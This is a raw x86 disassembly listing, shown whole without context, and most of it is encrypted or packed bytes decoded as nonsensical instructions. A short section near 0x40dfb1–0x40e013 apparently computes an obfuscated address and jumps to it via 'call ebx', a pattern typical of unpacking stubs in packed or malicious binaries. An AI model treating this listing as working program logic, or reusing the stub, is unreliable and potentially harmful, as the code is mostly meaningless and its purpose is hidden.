  40dbb6:	pop    esp
  40dbb7:	(bad)  
  40dbb8:	or     BYTE PTR [edx+0x1a],cl
  40dbbb:	sub    al,0x4e
  40dbbd:	mov    dh,0x86
  40dbbf:	jge    0x40dc24
  40dbc1:	jbe    0x40db63
  40dbc3:	in     al,dx
  40dbc4:	stos   BYTE PTR es:[edi],al
  40dbc5:	shl    DWORD PTR [ecx+0x48],1
  40dbc8:	adc    edi,DWORD PTR [ebx-0x5f029e43]
  40dbce:	inc    DWORD PTR [edi-0x3c8549a8]
  40dbd4:	push   ebp
  40dbd5:	fsub   st(3),st
  40dbd7:	sbb    DWORD PTR [edi],edi
  40dbd9:	outs   dx,BYTE PTR ds:[esi]
  40dbda:	inc    ebx
  40dbdb:	jo     0x40dbeb
  40dbdd:	sbb    ebx,DWORD PTR [edx-0x7627f763]
  40dbe3:	scas   eax,DWORD PTR es:[edi]
  40dbe4:	or     BYTE PTR ds:0xe0e42f86,dh
  40dbea:	pop    edx
  40dbeb:	mov    dl,0xe
  40dbed:	aas    
  40dbee:	clc    
  40dbef:	retf   
  40dbf0:	test   DWORD PTR [edi-0x4],ebp
  40dbf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbf4:	and    cl,ah
  40dbf6:	push   cs
  40dbf7:	inc    edi
  40dbf8:	push   cs
  40dbf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfa:	int3   
  40dbfb:	push   ds
  40dbfc:	rcl    dl,1
  40dbfe:	repnz mov BYTE PTR [esi+0x5aec5377],bl
  40dc05:	dec    esp
  40dc06:	std    
  40dc07:	and    al,0xbd
  40dc09:	loope  0x40dbe8
  40dc0b:	mov    cl,ch
  40dc0d:	add    ebp,DWORD PTR [ebp-0x780efd16]
  40dc13:	sub    BYTE PTR [esi+0x42],0xbf
  40dc17:	cmp    ah,BYTE PTR [ecx+0x60]
  40dc1a:	xor    al,0x58
  40dc1c:	push   edi
  40dc1d:	adc    al,BYTE PTR [eax+0xa]
  40dc20:	adc    DWORD PTR [ebp+0x4b],ebp
  40dc23:	jmp    0xbf22c838
  40dc28:	fwait
  40dc29:	sub    al,bl
  40dc2b:	mov    ds:0xa91fd277,eax
  40dc30:	jecxz  0x40dca1
  40dc32:	or     ebp,edx
  40dc34:	pop    ebp
  40dc35:	add    BYTE PTR [edi],bl
  40dc37:	dec    ebp
  40dc38:	rol    ah,0x2f
  40dc3b:	jmp    0x647c:0x80583f47
  40dc42:	mov    ss,WORD PTR [edx]
  40dc44:	mov    esp,0x1d9c3ec7
  40dc49:	lods   al,BYTE PTR ds:[esi]
  40dc4a:	xor    BYTE PTR [edi-0x35],dl
  40dc4d:	addr16 inc ebp
  40dc4f:	aad    0xc9
  40dc51:	bound  edx,QWORD PTR [esi]
  40dc53:	js     0x40dc50
  40dc55:	push   0xffffffeb
  40dc57:	sub    dl,bh
  40dc59:	mov    eax,0x845be815
  40dc5e:	in     al,0xfa
  40dc60:	inc    ecx
  40dc61:	lods   eax,DWORD PTR ds:[esi]
  40dc62:	ins    DWORD PTR es:[edi],dx
  40dc63:	mov    edx,0x8b08558b
  40dc68:	jge    0x40dc46
  40dc6a:	jmp    0x40df8a
  40dc6f:	repnz cmp al,0x15
  40dc72:	adc    al,0x31
  40dc74:	aad    0xf3
  40dc76:	fcom   DWORD PTR [eax*8+0x7c75c898]
  40dc7d:	xor    BYTE PTR [eax+0x7e7e9a35],bh
  40dc83:	jge    0x40dd02
  40dc85:	jle    0x40dd05
  40dc87:	lods   al,BYTE PTR ds:[esi]
  40dc88:	enter  0x5f1f,0x12
  40dc8c:	js     0x40dc0e
  40dc8e:	mov    ebp,0x895e41e6
  40dc93:	cdq    
  40dc94:	mov    DWORD PTR [ebp-0x343dd984],esp
  40dc9a:	outs   dx,BYTE PTR ds:[esi]
  40dc9b:	sub    BYTE PTR [ebp+0x4ed4f1c8],ch
  40dca1:	dec    esp
  40dca2:	mov    eax,0xee14d0a8
  40dca7:	adc    BYTE PTR [eax+0x76aeaaaa],bh
  40dcad:	loope  0x40dd23
  40dcaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcb0:	out    dx,eax
  40dcb1:	jmp    0x36d8:0xcc6a9627
  40dcb8:	aaa    
  40dcb9:	scas   eax,DWORD PTR es:[edi]
  40dcba:	xchg   BYTE PTR [ebx+0x7d134154],cl
  40dcc0:	xor    ebp,DWORD PTR [ebp+edx*8-0x3ee4f3bc]
  40dcc7:	jno    0x40dca0
  40dcc9:	repz (bad)
  40dccc:	push   eax
  40dccd:	xlat   BYTE PTR ds:[ebx]
  40dcce:	or     eax,0xd8bec67e
  40dcd3:	xchg   edx,eax
  40dcd4:	xchg   ebp,eax
  40dcd5:	cld    
  40dcd6:	adc    bl,BYTE PTR [esi]
  40dcd8:	push   ecx
  40dcd9:	loope  0x40dc6e
  40dcdb:	retf   
  40dcdc:	js     0x40dcf8
  40dcde:	jp     0x40dd50
  40dce0:	jg     0x40dc94
  40dce2:	jo     0x40dd62
  40dce4:	mov    edi,0x447fdbfa
  40dce9:	mov    dh,0xad
  40dceb:	push   edx
  40dcec:	fimul  DWORD PTR [esp+ebx*8]
  40dcef:	ja     0x40dd2d
  40dcf1:	mov    bh,0xf3
  40dcf3:	push   ebx
  40dcf4:	(bad)  
  40dcf5:	repz loopne 0x40dd21
  40dcf8:	mov    ds:0xe64fafee,eax
  40dcfd:	mov    esi,0x86fb62ad
  40dd02:	cdq    
  40dd03:	mov    DWORD PTR [ebx-0x4847cf0b],eax
  40dd09:	pop    edi
  40dd0a:	add    eax,0x77a0cb61
  40dd0f:	cdq    
  40dd10:	cmc    
  40dd11:	xor    al,0x95
  40dd13:	dec    esp
  40dd14:	sub    edi,0xa
  40dd17:	mov    ds:0xccda916,al
  40dd1c:	aas    
  40dd1d:	cmp    eax,0x9522b0a7
  40dd22:	jp     0x40dca5
  40dd24:	(bad)  
  40dd25:	mov    esi,0xa372be6a
  40dd2a:	add    esi,DWORD PTR [esi-0x52]
  40dd2d:	mov    esi,0xb9794ec9
  40dd32:	add    al,0xeb
  40dd34:	loope  0x40dd49
  40dd36:	inc    edx
  40dd37:	stc    
  40dd38:	jmp    0x40dce8
  40dd3a:	inc    edi
  40dd3b:	adc    DWORD PTR [edx+0x75],ebx
  40dd3e:	adc    eax,DWORD PTR [ebx]
  40dd40:	and    esi,DWORD PTR [ebx+0x66]
  40dd43:	aas    
  40dd44:	mov    edi,0x748dbd6f
  40dd49:	mov    ch,0xc8
  40dd4b:	mov    edi,DWORD PTR [edx+ebp*2-0x616b9daf]
  40dd52:	mov    ds:0x7ac310c4,al
  40dd57:	add    DWORD PTR [ecx-0x78],0x7
  40dd5b:	mov    ch,0x55
  40dd5d:	adc    bh,dh
  40dd5f:	xchg   ecx,eax
  40dd60:	mov    ds:0xf5d049eb,eax
  40dd65:	mov    bh,0xd2
  40dd67:	fwait
  40dd68:	adc    BYTE PTR ds:0xe298b42c,dh
  40dd6e:	ret    
  40dd6f:	sbb    eax,0x27ad99e1
  40dd74:	mov    ebp,0xa3b4a261
  40dd79:	les    edi,FWORD PTR [edx]
  40dd7b:	xchg   edi,eax
  40dd7c:	das    
  40dd7d:	push   edi
  40dd7e:	mov    cl,0xb4
  40dd80:	sti    
  40dd81:	xlat   BYTE PTR ds:[ebx]
  40dd82:	jl     0x40dd5c
  40dd84:	es int3 
  40dd86:	cmp    ch,bh
  40dd88:	mov    ebp,edi
  40dd8a:	out    0x34,al
  40dd8c:	aas    
  40dd8d:	mov    ecx,0xbca4e29f
  40dd92:	inc    edx
  40dd93:	mov    ah,0xf7
  40dd95:	(bad)  
  40dd96:	mov    esp,0xb461b14d
  40dd9b:	sbb    eax,0x2b838f22
  40dda0:	fld    QWORD PTR es:0x385ecd21
  40dda7:	cmpps  xmm2,XMMWORD PTR [ebx-0x62],0xf4
  40ddac:	not    BYTE PTR [ecx-0x3a]
  40ddaf:	jb     0x40dd66
  40ddb1:	test   eax,0x568cfd6a
  40ddb6:	mov    bh,dh
  40ddb8:	rcr    DWORD PTR [edi-0x1cdf599e],1
  40ddbe:	ins    DWORD PTR es:[edi],dx
  40ddbf:	into   
  40ddc0:	jns    0x40de21
  40ddc2:	lds    esp,FWORD PTR [esp+ecx*1+0x4652449d]
  40ddc9:	mov    fs,WORD PTR [esi-0x391315e]
  40ddcf:	push   ecx
  40ddd0:	shl    BYTE PTR [ecx+0x7db8d0e1],1
  40ddd6:	gs in  al,dx
  40ddd8:	scas   al,BYTE PTR es:[edi]
  40ddd9:	sbb    al,0xb8
  40dddb:	mov    esp,0x720b3fbf
  40dde0:	sbb    eax,0x408539e0
  40dde5:	(bad)  
  40dde6:	fdiv   DWORD PTR [ebx]
  40dde8:	push   ebp
  40dde9:	pop    ds
  40ddea:	sbb    edx,DWORD PTR [ebx]
  40ddec:	or     ebp,ebp
  40ddee:	mov    ds:0xc84d3945,al
  40ddf3:	pusha  
  40ddf4:	mov    bl,0x75
  40ddf6:	leave  
  40ddf7:	jl     0x40dd9b
  40ddf9:	pop    esi
  40ddfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddfb:	pop    ebp
  40ddfc:	or     bl,al
  40ddfe:	pop    edx
  40ddff:	jb     0x40ddd5
  40de01:	daa    
  40de02:	push   0x2c
  40de04:	sbb    al,0x5f
  40de06:	fwait
  40de07:	sbb    BYTE PTR [edi+0x2a],cl
  40de0a:	cmp    cl,BYTE PTR [edi-0x6d]
  40de0d:	inc    edi
  40de0e:	movaps XMMWORD PTR [ebp-0x441da549],xmm0
  40de15:	or     DWORD PTR [ebx-0x6e59d966],esi
  40de1b:	push   cs
  40de1c:	xchg   edi,eax
  40de1d:	mov    edx,gs
  40de1f:	xor    eax,0xf5574f5c
  40de24:	push   eax
  40de25:	jo     0x40de7b
  40de27:	adc    BYTE PTR [ebx-0x73c08eab],al
  40de2d:	ret    0x37df
  40de30:	cmp    esi,DWORD PTR [esi-0x1b970d6d]
  40de36:	mov    dl,0x1f
  40de38:	pop    edx
  40de39:	and    BYTE PTR [ecx+0x5ba8e0d2],bh
  40de3f:	mov    edi,0xc9431c1e
  40de44:	xchg   DWORD PTR [eax-0x73],esp
  40de47:	or     ebp,ebx
  40de49:	sahf   
  40de4a:	push   cs
  40de4b:	rcr    dh,1
  40de4d:	outs   dx,DWORD PTR ds:[esi]
  40de4e:	inc    esi
  40de4f:	jp     0x40ddfe
  40de51:	mov    edx,0x3733724a
  40de56:	xchg   ebp,eax
  40de57:	sub    al,0x6e
  40de59:	adc    DWORD PTR [ecx+0x1463a6b3],edi
  40de5f:	cld    
  40de60:	leave  
  40de61:	xchg   ebp,eax
  40de62:	xchg   esp,eax
  40de63:	pushf  
  40de64:	xor    eax,0xad4e4178
  40de69:	pushw  ds
  40de6b:	sar    DWORD PTR [ebx],0xb
  40de6e:	mov    ds:0xbe4f8f23,eax
  40de73:	lods   eax,DWORD PTR ds:[esi]
  40de74:	sub    bl,BYTE PTR [edx]
  40de76:	sbb    DWORD PTR [eax+eax*8+0x74],ebx
  40de7a:	push   esp
  40de7b:	push   esi
  40de7c:	mov    DWORD PTR [ebx],0x60bcc84e
  40de82:	fsubr  QWORD PTR [edi-0x5d]
  40de85:	in     eax,dx
  40de86:	aaa    
  40de87:	push   ebp
  40de88:	mov    al,ds:0xc9064b3e
  40de8d:	fld    TBYTE PTR ss:[ecx-0xc]
  40de91:	test   BYTE PTR [edx+0x65],dh
  40de94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de95:	jl     0x40de69
  40de97:	jl     0x40df06
  40de99:	jl     0x40df18
  40de9b:	in     eax,dx
  40de9c:	cmove  ebx,DWORD PTR [edx-0x1b2b9a01]
  40dea3:	jmp    0x210e734e
  40dea8:	cmp    edx,DWORD PTR [esi-0xeb9445a]
  40deae:	mov    al,0x9
  40deb0:	dec    ecx
  40deb1:	xchg   ecx,eax
  40deb2:	daa    
  40deb3:	pusha  
  40deb4:	cmp    BYTE PTR [ecx+0x2f],cl
  40deb7:	and    BYTE PTR [edi+0x41dd4c0],cl
  40debd:	fnsave [ecx]
  40debf:	lock xor bl,BYTE PTR [ecx+0x21]
  40dec3:	mov    al,ds:0xd2a415d0
  40dec8:	sti    
  40dec9:	stos   BYTE PTR es:[edi],al
  40deca:	jg     0x40de59
  40decc:	mov    DWORD PTR [esi],esi
  40dece:	jae    0x40df4f
  40ded0:	jmp    0x4d3c:0x863d516a
  40ded7:	or     al,0xf4
  40ded9:	pop    edi
  40deda:	sbb    ebp,DWORD PTR [ebp+0x5c2faacd]
  40dee0:	cmp    al,0xf3
  40dee2:	retf   0xaf5
  40dee5:	mov    al,ds:0xd8d02dba
  40deea:	mov    bh,0xa8
  40deec:	call   0x5db15631
  40def1:	add    DWORD PTR [esi-0x41],esp
  40def4:	pop    ebx
  40def5:	repnz cmp BYTE PTR ds:[ebx-0x4eb89315],al
  40defd:	jnp    0x40df3b
  40deff:	add    BYTE PTR [ecx-0x595a44c3],dh
  40df05:	mov    bl,0x47
  40df07:	inc    edx
  40df08:	inc    BYTE PTR ds:0x1765f8a1
  40df0e:	mov    ecx,0x431925ca
  40df13:	push   ebp
  40df14:	xchg   BYTE PTR [ebp+0x602a0259],dl
  40df1a:	mov    eax,0xb537abac
  40df1f:	mov    ds:0x580ece43,al
  40df24:	loopne 0x40df71
  40df26:	loope  0x40df73
  40df28:	outs   dx,DWORD PTR ds:[esi]
  40df29:	pop    eax
  40df2a:	test   eax,0xbd08ff50
  40df2f:	fimul  WORD PTR [esi]
  40df31:	or     DWORD PTR [edx-0x6a],edi
  40df34:	jno    0x40df64
  40df36:	sub    DWORD PTR [ecx+0x5c8565ca],esp
  40df3c:	fidiv  WORD PTR [ebx-0x59359276]
  40df42:	pushf  
  40df43:	adc    BYTE PTR [ebx+0x37],ch
  40df46:	xor    ebx,DWORD PTR [ebx+0x42af741e]
  40df4c:	adc    dl,BYTE PTR [ebp+0x4adc6532]
  40df52:	stc    
  40df53:	fidiv  DWORD PTR [edi+0x76155261]
  40df59:	sub    al,0x84
  40df5b:	sbb    DWORD PTR [ecx],eax
  40df5d:	leave  
  40df5e:	push   ecx
  40df5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df60:	sti    
  40df61:	test   BYTE PTR [edi+0x5b],dl
  40df64:	dec    ecx
  40df65:	sbb    BYTE PTR [eax+0x28],bl
  40df68:	mov    al,0x2
  40df6a:	sub    esp,DWORD PTR [ecx+0x7e211002]
  40df70:	daa    
  40df71:	in     eax,0xfa
  40df73:	fwait
  40df74:	lea    esp,[ebp-0x69041d7c]
  40df7a:	or     DWORD PTR [edi+edx*1-0x1b],esi
  40df7e:	repnz cld 
  40df80:	push   edi
  40df81:	out    0xe3,eax
  40df83:	fcmovu st,st(5)
  40df85:	adc    BYTE PTR [edi],dh
  40df87:	or     dh,BYTE PTR [edi]
  40df89:	sub    BYTE PTR [ecx+0x458b9704],cl
  40df8f:	call   0x3349351f
  40df94:	ror    DWORD PTR [ebp+0x729b1084],0x32
  40df9b:	add    BYTE PTR [ecx+0x458b0845],cl
  40dfa1:	call   0x33553531
  40dfa6:	rol    DWORD PTR [ebx],0xc6
  40dfa9:	imul   eax,DWORD PTR [edx]
  40dfac:	mov    edx,DWORD PTR [ebp-0x4]
  40dfaf:	xor    edx,ecx
  40dfb1:	mov    ecx,DWORD PTR [ebp+0x8]
  40dfb4:	lea    ecx,[edx+ecx*1+0x32729b]
  40dfbb:	cmp    ecx,eax
  40dfbd:	jne    0x40d5f9
  40dfc3:	mov    ebx,esi
  40dfc5:	jmp    0x40dfcf
  40dfca:	mov    ebx,0x32729b
  40dfcf:	mov    eax,DWORD PTR [ebp-0x4]
  40dfd2:	xor    eax,0x7510854
  40dfd7:	add    eax,ebx
  40dfd9:	mov    DWORD PTR [ebp-0xc],eax
  40dfdc:	xor    ebx,ebx
  40dfde:	lea    eax,[ebp-0x10]
  40dfe1:	add    ebx,DWORD PTR [eax]
  40dfe3:	call   ebx
  40dfe5:	xor    ebx,ebx
  40dfe7:	inc    ebx
  40dfe8:	cmp    DWORD PTR [ebp+0x10],ebx
  40dfeb:	je     0x40e009
  40dff1:	xchg   edx,eax
  40dff2:	push   0xa
  40dff4:	pop    ecx
  40dff5:	push   0x4
  40dff7:	pop    ebx
  40dff8:	inc    ebx
  40dff9:	xchg   ebx,ecx
  40dffb:	sub    ebx,ecx
  40dffd:	xchg   ebx,ecx
  40dfff:	dec    ecx
  40e000:	mov    eax,DWORD PTR [ebp-0x1c]
  40e003:	imul   eax,ecx
  40e006:	add    esp,eax
  40e008:	xchg   edx,eax
  40e009:	push   eax
  40e00a:	xor    ebx,ebx
  40e00c:	mov    edx,esp
  40e00e:	dec    edx
  40e00f:	inc    ebx
  40e010:	add    ebx,DWORD PTR [edx+ebx*1]
  40e013:	jmp    0x40e333
  40e018:	lods   al,BYTE PTR ds:[esi]
  40e019:	and    bl,bl
  40e01b:	xchg   esp,eax
  40e01c:	jno    0x40e073
  40e01e:	jno    0x40e042
  40e020:	add    cl,cl
  40e022:	cmovge esp,DWORD PTR cs:[eax]
  40e026:	arpl   WORD PTR [edi+0x30],sp
  40e029:	cdq    
  40e02a:	jle    0x40e0aa
  40e02c:	jge    0x40e0ab
  40e02e:	jle    0x40e0ae
  40e030:	retf   
  40e031:	test   ecx,ebp
  40e033:	inc    ebp
  40e034:	cmc    
  40e035:	fcmovu st,st(7)
  40e037:	jmp    0x40e090
  40e039:	inc    esp
  40e03a:	jmp    0x40e035
  40e03c:	cs cs mov edi,0x32b72991
  40e043:	sub    BYTE PTR [edx+eiz*2],bl
  40e046:	and    BYTE PTR [edx+0x27],al
  40e049:	push   es
  40e04a:	jb     0x40e023
  40e04c:	cwde   
  40e04d:	sbb    al,0x16
  40e04f:	fnstsw WORD PTR [esi]
  40e051:	bound  ecx,QWORD PTR [bp+di+0x7d66]
  40e056:	(bad)  
  40e057:	jo     0x40e016
  40e059:	pop    es
  40e05a:	test   BYTE PTR [edx-0x4f],0xc5
  40e05e:	sbb    eax,0xfaabefdb
  40e063:	pmulhw mm1,QWORD PTR [edx]
  40e066:	pxor   mm3,QWORD PTR [eax+eax*2+0x36]
  40e06b:	sub    ebp,DWORD PTR [ebx+0x16b73ea2]
  40e071:	addr16 pusha 
  40e073:	fmul   st(7),st
  40e075:	or     BYTE PTR [ebp-0x665ebde0],0x3a
  40e07c:	or     dh,BYTE PTR [ebp-0x3a]
  40e07f:	pop    ebx
  40e080:	cdq    
  40e081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e082:	jbe    0x40e079
  40e084:	fisttp QWORD PTR [ebx]
  40e086:	sub    bl,BYTE PTR [edx]
  40e088:	and    dh,BYTE PTR [ebp+0x396df8e7]
  40e08e:	xchg   eax,esi
  40e090:	mov    eax,ds:0x4ed0e45e
  40e095:	adc    DWORD PTR [ebp+0x5c7d17],esp
  40e09b:	mov    esp,0xedfca5c3
  40e0a0:	push   edi
  40e0a1:	outs   dx,DWORD PTR ds:[esi]
  40e0a2:	push   ds
  40e0a3:	cmp    dh,BYTE PTR [edx+0x66d07233]
  40e0a9:	mov    eax,ds:0x9e909a23
  40e0ae:	pop    ebp
  40e0af:	es push ebp
  40e0b1:	sbb    ebp,esp
  40e0b3:	dec    BYTE PTR [eax-0x39]
  40e0b6:	cmp    BYTE PTR [eax-0x7f],0x40
  40e0ba:	pop    edx
  40e0bb:	ins    BYTE PTR es:[edi],dx
  40e0bc:	popa   
  40e0bd:	add    eax,DWORD PTR [esi]
  40e0bf:	and    al,0xc3
  40e0c1:	xchg   DWORD PTR [esi-0x672f59d],ecx
  40e0c7:	stc    
  40e0c8:	pop    esi
  40e0c9:	or     DWORD PTR [edi],eax
  40e0cb:	fidivr DWORD PTR [ebp-0x49]
  40e0ce:	pop    edi
  40e0cf:	scas   al,BYTE PTR es:[edi]
  40e0d0:	cdq    
  40e0d1:	cwde   
  40e0d2:	xchg   DWORD PTR [esi],ebx
  40e0d4:	pusha  
  40e0d5:	nop
  40e0d6:	mov    DWORD PTR [edi+0x7e],ebp
  40e0d9:	mov    cl,0xb8
  40e0db:	sahf   
  40e0dc:	outs   dx,DWORD PTR ds:[esi]
  40e0dd:	test   ebp,edx
  40e0df:	xlat   BYTE PTR ds:[ebx]
  40e0e0:	leave  
  40e0e1:	fsub   DWORD PTR [esi]
  40e0e3:	test   al,0x91
  40e0e5:	pusha  
  40e0e6:	pop    es
  40e0e7:	icebp  
  40e0e8:	bound  eax,QWORD PTR [edi+0x58]
  40e0eb:	inc    edi
  40e0ec:	inc    esi
  40e0ed:	enter  0x26a6,0xd1
  40e0f1:	add    eax,0xe7df401c
  40e0f6:	and    eax,0x81b333f5
  40e0fb:	mov    bl,0x73
  40e0fd:	push   esp
  40e0fe:	mov    al,ds:0xad31ef52
  40e103:	and    DWORD PTR [esi+0xc],ebp
  40e106:	jle    0x40e0bd
  40e108:	pop    ecx
  40e109:	jns    0x40e0f3
  40e10b:	(bad)  
  40e10c:	hlt    
  40e10d:	xor    BYTE PTR [edx+0x51],0x7c
  40e111:	add    eax,0xad89377f
  40e116:	jne    0x40e17d
  40e118:	mov    dh,0xe
  40e11a:	jne    0x40e0dc
  40e11c:	and    BYTE PTR [ebp+0x39c9ad0],bl
  40e122:	cmp    BYTE PTR [eax],bh
  40e124:	mov    WORD PTR [edx-0x38b03697],fs
  40e12a:	fld    QWORD PTR [edi]
  40e12c:	(bad)  
  40e12d:	(bad)  
  40e12e:	call   0x98b3c4a1
  40e133:	mov    DWORD PTR [esi],esp
  40e135:	push   ecx
  40e136:	sti    
  40e137:	scas   eax,DWORD PTR es:[edi]
  40e138:	loope  0x40e0eb
  40e13a:	ds jmp 0xcc15:0xd9bba589
  40e142:	repz rol DWORD PTR [ecx],0x86
  40e146:	xchg   edi,eax
  40e147:	mov    esp,0xe2cb3e28
  40e14c:	outs   dx,DWORD PTR ds:[esi]
  40e14d:	pop    ebx
  40e14e:	xchg   edi,eax
  40e14f:	mov    ch,0xdd
  40e151:	fsub   st(7),st
  40e153:	jp     0x40e15b
  40e155:	inc    esp
  40e156:	stos   DWORD PTR es:[edi],eax
  40e157:	je     0x40e0ef
  40e159:	or     DWORD PTR [edx+0x4a],ebp
  40e15c:	scas   al,BYTE PTR es:[edi]
  40e15d:	sbb    ch,dl
  40e15f:	add    BYTE PTR [ecx-0x205a98fb],dh
  40e165:	sub    dl,BYTE PTR [esi+ebx*1-0x7219bced]
  40e16c:	pop    ecx
  40e16d:	ins    DWORD PTR es:[edi],dx
  40e16e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e16f:	out    dx,al
  40e170:	sub    DWORD PTR [esi],eax
  40e172:	adc    al,0x84
  40e174:	aad    0x1d
  40e176:	pop    edx
  40e177:	fs leave 
  40e179:	sub    bh,BYTE PTR [ecx]
  40e17b:	push   ds
  40e17c:	sbb    al,0xf7
  40e17e:	mov    dh,0xb8
  40e180:	pop    edi
  40e181:	inc    esi
  40e182:	std    
  40e183:	add    ah,BYTE PTR [edi]
  40e185:	fadd   QWORD PTR [edi*4-0x2c5de6af]
  40e18c:	cmp    bh,BYTE PTR [ecx]
  40e18e:	mov    ebx,DWORD PTR [edx]
  40e190:	push   edx
  40e191:	cmp    DWORD PTR [esi+0x1ad162c4],ecx
  40e197:	in     eax,0xbb
  40e199:	ins    BYTE PTR es:[edi],dx
  40e19a:	lock (bad) 
  40e19d:	cdq    
  40e19e:	cmp    ebx,eax
  40e1a0:	std    
  40e1a1:	jle    0x40e129
  40e1a3:	adc    DWORD PTR [edx+0x1d9fc366],ecx
  40e1a9:	mov    bl,0x4
  40e1ab:	pushf  
  40e1ac:	loopne 0x40e1dc
  40e1ae:	push   ds
  40e1af:	xor    esp,DWORD PTR [esp+eiz*2+0x62433d60]
  40e1b6:	mov    cl,0x32
  40e1b8:	test   bl,0x86
  40e1bb:	loope  0x40e1fa
  40e1bd:	or     DWORD PTR [ecx-0x5a],ebx
  40e1c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1c1:	xchg   esp,eax
  40e1c2:	fistp  DWORD PTR [edx+0x36]
  40e1c5:	dec    edi
  40e1c6:	iret   
  40e1c7:	pop    ebp
  40e1c8:	std    
  40e1c9:	rcr    BYTE PTR [esi-0x6f],1
  40e1cc:	jl     0x40e186
  40e1ce:	push   esp
  40e1cf:	pop    esp
  40e1d0:	fild   DWORD PTR [eax+ecx*4+0x2aab7ad0]
  40e1d7:	pop    ecx
  40e1d8:	add    DWORD PTR [ecx-0x1d],ebp
  40e1db:	test   al,0xf2
  40e1dd:	inc    ebx
  40e1de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1df:	fmul   st(5),st
  40e1e1:	and    eax,0x8c55e0c3
  40e1e6:	push   edx
  40e1e7:	call   0x85e5834a
  40e1ec:	adc    al,0xaa
  40e1ee:	add    al,0x11
  40e1f0:	and    eax,0xf1597f40
  40e1f5:	retf   
  40e1f6:	xor    ecx,ebp
  40e1f8:	repz xchg esp,eax
  40e1fa:	jg     0x40e204
  40e1fc:	inc    esp
  40e1fd:	clc    
  40e1fe:	fstp   QWORD PTR [ebx]
  40e200:	mov    esp,fs
  40e202:	add    cl,0x9c
  40e205:	aas    
  40e206:	(bad)  
  40e207:	test   al,0x1d
  40e209:	lods   al,BYTE PTR ds:[esi]
  40e20a:	and    al,0x43
  40e20c:	xor    BYTE PTR [eax],bl
  40e20e:	pop    edx
  40e20f:	je     0x40e211
  40e211:	xor    DWORD PTR [ebp+0x4d],esi
  40e214:	push   DWORD PTR [edi]
  40e216:	dec    ebp
  40e217:	nop
  40e218:	pop    edi
  40e219:	dec    edx
  40e21a:	push   ss
  40e21b:	(bad)  [edi+0x102651dc]
  40e221:	and    eax,DWORD PTR ds:0xc5fe2de
  40e227:	pop    esp
  40e228:	push   0xb287bff0
  40e22d:	dec    esi
  40e22e:	sub    ebp,DWORD PTR [esi+eax*8-0x6859c569]
  40e235:	or     esp,edx
  40e237:	pop    edi
  40e238:	out    0xd3,eax
  40e23a:	fisttp QWORD PTR [edi+0x3691fd6c]
  40e240:	das    
  40e241:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e243:	inc    ebp
  40e244:	jb     0x40e29a
  40e246:	inc    ebx
  40e247:	call   0xc2781d6
  40e24c:	dec    esp
  40e24d:	js     0x40e201
  40e24f:	test   DWORD PTR [edi+0x36d94953],esp
  40e255:	sub    eax,0xfc76d96
  40e25a:	icebp  
  40e25b:	push   ebp
  40e25c:	loop   0x40e2d9
  40e25e:	pop    edi
  40e25f:	sbb    DWORD PTR [ebp+esi*2-0x3e],ecx
  40e263:	sbb    al,0x51
  40e265:	cmp    al,0xa6
  40e267:	dec    ecx
  40e268:	pushf  
  40e269:	(bad)  
  40e26a:	sub    cl,BYTE PTR [esi-0x18f77d92]
  40e270:	(bad)  
  40e271:	repnz cwde 
  40e273:	fadd   DWORD PTR [edx-0x12]
  40e276:	out    0xf9,al
  40e278:	pop    edi
  40e279:	pop    eax
  40e27a:	mov    esp,0x195c3b8c
  40e27f:	ret    
  40e280:	add    BYTE PTR [ecx+0x24],bl
  40e283:	or     BYTE PTR ds:0x2d92b8be,0xe6
  40e28a:	sahf   
  40e28b:	dec    edx
  40e28c:	jle    0x40e274
  40e28e:	mov    bh,0x51
  40e290:	sub    BYTE PTR [ecx+0x15641773],dh
  40e296:	mov    eax,ds:0x27ee4d43
  40e29b:	sbb    eax,0x8f2160eb
  40e2a0:	ret    
  40e2a1:	in     al,0x44
  40e2a3:	sub    ecx,esi
  40e2a5:	xchg   esi,eax
  40e2a6:	adc    ah,BYTE PTR [ebx]
  40e2a8:	ffree  st(3)
  40e2aa:	in     eax,0x6d
  40e2ac:	(bad)  
  40e2ad:	jg     0x40e309
  40e2af:	xlat   BYTE PTR ds:[ebx]
  40e2b0:	shr    BYTE PTR [edi+0x11],1
  40e2b3:	or     bl,BYTE PTR [eax-0xf]
  40e2b6:	in     eax,dx
  40e2b7:	call   0x6de42cde
  40e2bc:	(bad)  
  40e2bd:	cmp    eax,0x84b29cbd
  40e2c2:	mov    eax,0x7fac0bc3
  40e2c7:	xchg   ebp,eax
  40e2c8:	sbb    al,0x84
  40e2ca:	fdivr  QWORD PTR [edx]
  40e2cc:	test   eax,0x35d48546
  40e2d1:	cs and eax,0xab24cfd
  40e2d7:	or     ch,BYTE PTR [eax+0x36]
  40e2da:	mov    BYTE PTR [ebx+0x5e],ch
  40e2dd:	adc    DWORD PTR [edi-0x43c0b5af],0x20
  40e2e4:	arpl   WORD PTR es:[ebp-0x62e54e4],cx
  40e2eb:	ins    DWORD PTR es:[edi],dx
  40e2ec:	xor    al,dl
  40e2ee:	cs cdq 
  40e2f0:	out    dx,al
  40e2f1:	sub    eax,0x178e62dc
  40e2f6:	push   eax
  40e2f7:	adc    al,0x27
  40e2f9:	mov    ds:0xd626eb4d,al
  40e2fe:	jno    0x40e336
  40e300:	add    ebx,DWORD PTR [ebx+ecx*4]
  40e303:	aam    0x9d
  40e305:	(bad)  
  40e306:	pop    ebp
  40e307:	out    0xba,eax
  40e309:	fnstenv [ebx]
  40e30b:	xchg   ebp,eax
  40e30c:	cmp    DWORD PTR [eax+0x21d976d],ebp
  40e312:	test   bh,al
  40e314:	loopne 0x40e30c
  40e316:	or     eax,0x59450f0e
  40e31b:	retf   
  40e31c:	mov    ds:0x9576fe61,al
  40e321:	mov    ds:0xfe39125c,al
  40e326:	pop    ds
  40e327:	ja     0x40e2f9
  40e329:	dec    eax
  40e32a:	or     cl,bl
  40e32c:	in     eax,0xcb
  40e32e:	push   ss
